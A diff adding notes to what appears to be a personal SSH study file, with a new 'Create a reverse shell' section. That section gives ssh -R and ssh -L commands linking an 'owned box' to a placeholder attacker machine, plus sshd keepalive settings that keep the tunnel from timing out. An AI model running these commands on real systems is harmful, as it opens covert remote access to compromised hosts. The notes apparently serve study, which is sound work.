@@ -318,8 +318,32 @@ PermitRootLogin no
 #+BEGIN_EXAMPLE
 Protocol 2
 #+END_EXAMPLE
+** Create a reverse shell
+- this would only provide one step away from the target machine
+#+BEGIN_SRC sh
+ssh -R 1337:localhost:22 root@attacker_machine
+#+END_SRC
+the cmd connects the owned box to the attacker's machine using port 1337
+
+- using a machine between attacker and target
+#+BEGIN_SRC sh
+ssh -L 31337:localhost:1337 -f -N -g root@attacker_machine
+#+END_SRC
+now the the attacker connects from another machine to 31337 and is connected to the owned machine
+
+- the owned machine would quickly timeout if the sshd_config hasn't been edited
+#+BEGIN_EXAMPLE
+TCPKeepAlive yes
+ClientAliveInterval 30
+ClientAliveCountMax 99999
+#+END_EXAMPLE
+
+
 * Lecture
 * Tutorial
+** Linux Academy - Server Application Requires a Secure SSH connection
+Guide: [[file://home/crito/Documents/Linux/Labs/secure-ssh-lab.pdf][SSH connection]] 
+
 * Books
 * Links
 [[https://www.slac.stanford.edu/comp/unix/sshGSSAPI.html][Using SSH and GSSAPI Authentication]]
